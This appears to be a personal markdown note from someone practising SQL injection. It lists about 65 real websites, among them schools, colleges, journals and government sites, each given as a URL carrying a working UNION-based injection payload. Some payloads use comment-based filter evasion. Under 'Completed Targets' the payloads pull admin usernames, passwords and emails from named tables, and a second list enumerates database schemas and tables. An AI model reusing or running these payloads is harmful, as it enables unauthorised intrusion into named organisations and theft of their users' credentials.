# <mark style="background: #FF5582A6;">For Review : </mark> 
[[1-Intro]]
[[2-Sql Injection (Basic)]]
# <mark style="background: #FFB86CA6;">Completed Targets : 
</mark> 

1. http://kansascitynova.org/news.php?id=42%27%20union%20select%201,2,3,4,group_concat(username,0x3a3a,email,0x3a3a,password,%27%3Cbr%3E%27),6,7%20from%20sadmin_users--+

2. https://tristoneandtile.com/product.php?id=852999999.9%27%20union%20select%201,2,3,4,5,group_concat(admin_username,0x3a3a,admin_password,0x3a3a,admin_email,%20%27%3Cbr%3E%27),7,8,9,10,11,12,13,14%20from%20sq_admin--+

3. http://steerwings.com/university.php?id=-5%27%20union%20select%201,group_concat(usrsecunm_busssetup_eusr,0x3a3a,usrsecpwd_gpnl_busssetuppwd,%20%27%3Cbr%3E%27),3,4,5,6%20from%20bussasecsetepadm_stnlogn_tb--+

4. https://ijepr.org/paper.php?id=-204%27%20union%20select%201,2,3,4,group_concat(email,0x3a3a,password,%20%27%3Cbr%3E%27),6,7,8,9,10%20from%20admin--+

5. http://piriya-international.com/product.php?id=-72%20/*!12345union*//*!12345select*/%201,2,3,4,/*!12345unhex(hex(group_concat(email,0x3a3a,password,%20%27%3Cbr%3E%27)))*/,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34%20/*!12345from*/%20t_account--

6. https://www.htps.edu.hk/en/school.php?id=-19%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,unhex(hex(group_concat(usr_login_name,0x3a3a,usr_name,0x3a3a,usr_email,0x3a3a,usr_pwd,%20%27%3Cbr%3E%27))),21%20from%20usr--+

7. http://www.marywardlubhu.edu.np/school.php?id=168&cat_id=23%27%20/*!12345union*/%20select%20group_concat(username,0x3a3a,password,%20%27%3Cbr%3E%27)%20from%20tbl_admin--+

8. https://www.lingto.edu.hk/en/school.php?id=-59%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,unhex(hex(group_concat(usr_login_name,0x3a3a,usr_name,0x3a3a,usr_email,0x3a3a,usr_pwd,%20%27%3Cbr%3E%27))),21,22,23,24,25%20from%20usr--+

9. http://project-lovcen.me/gallery.php?id=-42%20union%20select%201,group_concat(user_id,0x3a3a,usn,0x3a3a,pass,%20%27%3Cbr%3E%27)%20from%20administracija--

10. https://www.appasamy.com/gallery.php?id=-9%27%20union%20select%201,group_concat(username,0x3a3a,password,0x3a3a,email,%20%27%3Cbr%3E%27),3,4,5,6%20from%20admin--+

11. https://www.jisa.ac.in/gallery.php?id=-8%27%20union%20select%201,2,3,unhex(hex(group_concat(USER_NAME,0x3a3a,USER_PASS,%20%27%3Cbr%3E%27))),5,6,7,8,9,10%20from%20tbl_m_user--+

12. https://www.lghk.com/product.php?id=58&pid=-7%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,group_concat(usr_name,0x3a3a,usr_email,0x3a3a,usr_pwd),17%20from%20usr--

13. http://dhanalakshmicollegeofnursing.org/school.php?id=-12%20union%20select%201,group_concat(user_name,0x3a3a,user_password,0x3a3a,user_email,%20%27%3Cbr%3E%27),3,4,5,6,7%20from%20user--

14. http://ddpsbijnor.edu.in/ddpsbijnor-Gallery.php?id=-4%27%20/*!12345union*/%20/*!12345select*/%201,/*!12345unhex(hex(group_concat(username,0x3a3a,password,0x3a3a,email,%20%27%3Cbr%3E%27)))*/,3,4,5%20/*!12345from*/%20tbl_admin--+

15. https://theheritageschool.org/details-event.php?id=-162%27%20/*!12345union*/%20%20/*!12345select*/%201,%20/*!12345unhex(hex(group_concat(admin_name,0x3a3a,password,%20%27%3Cbr%3E%27)))*/,3,4,5,6,7%20%20/*!12345from*/%20dt_admin--+

16. https://www.rad-journal.org/paper.php?id=-5%27%20/*!12345union*/%20select%201,2,3,group_concat(Mobile,0x3a3a,email,%20%27%3Cbr%3E%27),5,6,7,8,9,10,11,12,13,14%20from%20radconfe_2016.registrations--+

17. http://vidyasthal.com/cs-professional.php?id=-7%27%20union%20select%201,2,group_concat(admin_name,0x3a3a,password,0x3a3a,email,%20%27%3Cbr%3E%27),4%20from%20admin--+

18. https://kecspulincunnoo.ac.in/academics.php?id=-7%27%20/*!12345union*/%20/*!12345select*/%201,2,/*!12345unhex(hex(group_concat(uname,0x3a3a,pwd,%20%27%3Cbr%3E%27)))*/,4,5,6%20/*!12345from*/%20login--+

19. http://barjoracollege.org/academics.php?id=4&sid=34&tid=-20%20union%20select%20group_concat(username,0x3a3a,password,%20%27%3Cbr%3E%27)%20from%20tbl_admin--

20. https://gpgcagastyamuni.org/department.php?id=-57%27%20union%20select%201,2,group_concat(user_id,0x3a3a,password,%20%27%3Cbr%3E%27),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%20from%20admin--+

21. https://www.sncollegekannur.ac.in/department.php?id=-10%27%20union%20select%201,2,3,group_concat(username,0x3a3a,password,%20%27%3Cbr%3E%27),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25%20from%20adminlogin--+

22. https://lrfes.com/department.php?id=-31%27%20union%20select%201,2,3,4,group_concat(email,0x3a3a,password,%20%27%3Cbr%3E%27),6,7,8,9,10,11,12,13,14,15,16,17,18,19%20from%20users--+

23. https://www.krssnc.in/department.php?id=-2%27%20union%20select%201,2,3,group_concat(username,0x3a3a,password,0x3a3a,email,%20%27%3Cbr%3E%27),5,6,7,8,9,10%20from%20tbl_admin--+

24. http://www.tnmps.com/academics.php?id=-1%20union%20select%201,2,group_concat(user_name,0x3a3a,password,%20%27%3Cbr%3E%27),4,5%20from%20_sch_user--

25. http://www.nerailwaygic.com/academics.php?id=-1%27%20union%20select%201,2,group_concat(username,0x3a3a,password,%20%27%3Cbr%3E%27),4,5%20from%20_vis_users--+

26. http://www.gracademy.in/academics.php?id=-2%27%20union%20select%201,2,group_concat(username,0x3a3a,password,%20%27%3Cbr%3E%27),4,5,6,7,8%20from%20_vis_users--+

27. http://www.springerloretto.in/academics.php?id=-4%27%20union%20select%201,2,group_concat(username,0x3a3a,password,%20%27%3Cbr%3E%27),4,5,6,7,8%20from%20_vis_users--+

28. https://www.chinmayadc.edu.in/department.php?id=-41%27%20union%20select%201,2,3,group_concat(user_id,0x3a3a,password,%20%27%3Cbr%3E%27),5,6,7%20from%20admin--+

29. https://www.nootancollegeofnursing.org/hospital.php?id=-22%20union%20select%201,2,group_concat(username,0x3a3a,password,0x3a3a,email,%20%27%3Cbr%3E%27),4,5%20from%20admin--

30. http://www.afaatim.com/title.php?id=-295%27%20union%20select%201,group_concat(user_name,0x3a3a,user_password,%20%27%3Cbr%3E%27)%20from%20admin_user--+

31. https://www.saide.org.za/project.php?id=-58%20union%20select%201,2,3,group_concat(username$text,0x3a3a,email$text,0x3a3a,password$password,%20%27%3Cbr%3E%27),5,6,7,8,9,10,11,12,13,14,15,16,17,18%20from%20users--

32. https://www.realroofers.com/view-project.php?id=-23%20/*!12345union*/%20/*!12345select*/%201,2,3,4,5,6,/*!12345group_concat(username,0x3a3a,password,0x3a3a,email,%20%27%3Cbr%3E%27)*/,8,9,10,11,12,13%20/*!12345from*/%20users--

33. http://burobd.org/remittance-program.php?id=-14%27%20union%20select%201,2,group_concat(username,0x3a3a,password,%20%27%3Cbr%3E%27),4,5,6,7,8%20from%20admin--+

34. https://www.ntcm.com.ph/cadet-program.php?id=-9%27%20union%20select%201,2,group_concat(username,0x3a3a,password,%20%27%3Cbr%3E%27),4,5,6,7,8,9%20from%20user--+

35. http://tibarose.com/social-project.php?lang=esp&id=-222%20/*!12345union*/%20/*!12345select*/%201,2,3,4,5,6,/*!12345group_concat(username,0x3a3a,password,0x3a3a,email,%20%27%3Cbr%3E%27)*/%20/*!12345from*/%20members--

36. http://www.bethanyashram.net/institution.php?id=-4%27%20/*!12345union*/%20/*!12345select*/%201,2,3,/*!12345unhex(hex(group_concat(uname,0x3a3a,pwd,%20%27%3Cbr%3E%27)))*/,5%20/*!12345from*/%20login--+

37. https://www.knowledgekingdom.com.jo/english/program.php?id=-2021%27%20/*!12345union*/%20/*!12345select*/%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,/*!12345unhex(hex(group_concat(AIC_REG_MOBILE,0x3a3a,AIC_REG_EMAIL,%20%27%3Cbr%3E%27)))*/,71,72,73,74%20/*!12345from*/%20REGISTRATIONS--+

38. http://ksgroupcolleges.com/gallery.php?id=-6%27%20union%20select%201,group_concat(user,0x3a3a,pass,0x3a3a,email),3,4%20from%20admin--+
	<mark style="background: #FF5582A6;">(user va pass va email in picture tab)
</mark> 

39. http://www.mudp.gov.bd/photo-gallery.php?id=-18%20union%20select%201,2,3,4,group_concat(username,0x3a3a,password)%20from%20membership--
	<mark style="background: #FF5582A6;">(user va pass in picture tab)</mark> 

40. https://www.pacificsymphony.org/photo-gallery.php?id=-67%27%20union%20select%20group_concat(admin_email,0x3a3a,admin_user,0x3a3a,admin_pass)%20from%20administrators--+

	with : [[5-Source (Method)]]

41. https://www.cherishexpeditions.com/program.php?id=-1%20union%20select%201,group_concat(username,0x3a3a,pw,%20%27%3Cbr%3E%27),3,4,5,6,7,8%20from%20admin--&type=2
	<mark style="background: #FF5582A6;">(important table found in source)</mark> 

42. http://www.4remedy.com/travel.php?id=-Travel%20India%27%20union%20select%201,2,3,4,group_concat(emailid,0x3a3a,password,%20%27%3Cbr%3E%27),6,7,8,9,10,11,12%20from%20administrator--+

43. https://www.fidaato.in/vatsalya/news.php?id=-24%27%20union%20select%201,unhex(hex(group_concat(name,0x3a3a,password,0x3a3a,email,%20%27%3Cbr%3E%27))),3%20from%20vatsalya_ch_a_cli_nil--+

	with : [[7-Like (Method)]]

44. http://www.riyadhtravel.net/travel.php?id=-6%27%20/*!12345union*/%20/*!12345select*/%201,2,3,username,5,6,7,8,9,10,11,12,13%20from%20admin--+

	http://www.riyadhtravel.net/travel.php?id=-6%27%20/*!12345union*/%20/*!12345select*/%201,2,3,password,5,6,7,8,9,10,11,12,13%20from%20admin--+
	
	with : [[9-Version 4]]

45. view-source:https://m.lok1lok.com/img.php?id=-145%20union%20select%20111,222,333,444,555,unhex(hex(group_concat(username,0x3a3a,phone,0x3a3a,email,0x3a3a,password))),777,888,999,10,11,12,13,14,15%20from%20tbl_member--

# <mark style="background: #FFB86CA6;">The Following Sites Don't Have An Admin Panel Or An Important Table :</mark> 

1. http://www.bjp-bg.com/paper.php?id=-770%20UNION%20SELECT%201,2,3,4,group_concat(schema_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307%20from%20information_schema.schemata--

2. http://www.pendragonpress.com/book.php?id=-499%27%20union%20select%201,group_concat(schema_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24%20from%20information_schema.schemata--+

3. http://www.myskillsforlife.com/course-book.php?ID=-41%27%20union%20select%201,2,3,4,5,6,7,8,9,group_concat(schema_name,%20%27%3Cbr%3E%27),11,12,13,14,15%20from%20information_schema.schemata--+

4. https://www.lghk.com/product.php?id=58&pid=-7%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,unhex(hex(group_concat(schema_name))),17%20from%20information_schema.schemata--

5. http://www.webloadmpstore.com/product.php?id=-3%20/*!12345union*/%20select%201,2,3,4,5,6,7--

6. http://www.meg.com.eg/product.php?id=43%27%20union%20select%201,2,3,group_concat(Username,0x3a3a,Password,0x3a3a,Email,%20%27%3Cbr%3E%27),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20%20from%20information_schema.columns%20where%20table_name=users--+

7. http://www.thompson-brothers.com/product.php?id=10%20/*!12345union*/%20select%201,2,3,4,5,6--

8. https://www.thecryers.com/gallery.php?id=-9%27%20union%20select%201,2,3,4,5,6,7,group_concat(column_name,%20%27%3Cbr%3E%27),9,10%20from%20information_schema.columns%20where%20table_name=%27tbl_menu%27--+

9. https://www.hele.com.tw/human.php?id=-32%27%20union%20select%201,2,group_concat(table_name,%20%27%3Cbr%3E%27),4,5%20from%20information_schema.tables%20where%20table_schema=%27mysql%27--+

10. http://www.imcconcerts.com/artist.php?id=-16%20union%20select%201,2,group_concat(column_name,%20%27%3Cbr%3E%27),4,5,6,7,8,9%20from%20information_schema.columns%20where%20table_name=%27admin%27--&month=

11. https://sindhculture.gov.pk/book.php?id=-183%27%20/*!12345union*/%20select%201,2,3,4,5,6,group_concat(column_name,%20%27%3Cbr%3E%27),database(),9%20from%20information_schema.columns%20where%20table_name=%27admins%27--+

12. https://www.conbrouder.ie/gallery.php?id=-11%27%20union%20select%201,2,3,4,5,6,group_concat(table_name),8,9,10,11,12,13,14,15,16,17%20from%20information_schema.tables%20where%20table_schema=database()--+

13. http://www.waytogocc.com/city.php?id=-22%27%20union%20select%201,group_concat(schema_name,%20%27%3Cbr%3E%27),3,4,5,6,7,8%20from%20information_schema.schemata--+

14. http://www.carrot-home.com/project.php?id=-1%20union%20select%201,2,3,group_concat(table_name,%20%27%3Cbr%3E%27),5,6,7,8,9%20from%20information_schema.tables%20where%20table_schema=database()--

15. https://mcisonline.com/institution.php?id=-6%20union%20select%201,group_concat(table_name,%20%27%3Cbr%3E%27)%20from%20information_schema.tables%20where%20table_schema=database()--

16. https://www.morrisberger.com/position.php?id=-2195%20union%20select%201,2,3,4,5,6,7,group_concat(table_name,%20%27%3Cbr%3E%27),9,10,11%20from%20information_schema.tables%20where%20table_schema=database()--

17. https://bennioncenter.org/programs/program.php?id=-117%27%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,group_concat(column_name,%20%27%3Cbr%3E%27),16,17%20from%20information_schema.columns%20where%20table_name=%27admins%27--+

18. http://www.boblangrish.com/bob%20langrish%20travel.php?id=-58%20/*!12345union*/%20/*!12345select*/%201,/*!12345table_name*/,3,4,5%20/*!12345from*/%20/*!12345information_schema*/./*!12345tables*/%20where%20table_schema=database()--

19. https://rajgad.edu.in/department.php?id=-4%20/*!12345union*/%20/*!12345select*/%201,/*!12345group_concat(table_name,%20%27%3Cbr%3E%27)*/,3,4,5,6,7,8,9,10,11%20/*!12345from*/%20/*!12345information_schema*/./*!12345tables*/%20where%20table_schema=database()--

20. https://www.rskcbseschool.in/academics.php?id=-11%27%20union%20select%201,2,3,group_concat(table_name,%20%27%3Cbr%3E%27),5%20from%20information_schema.tables%20where%20table_schema=database()--+&page=ASSESSMENT%20AND%20REPORTING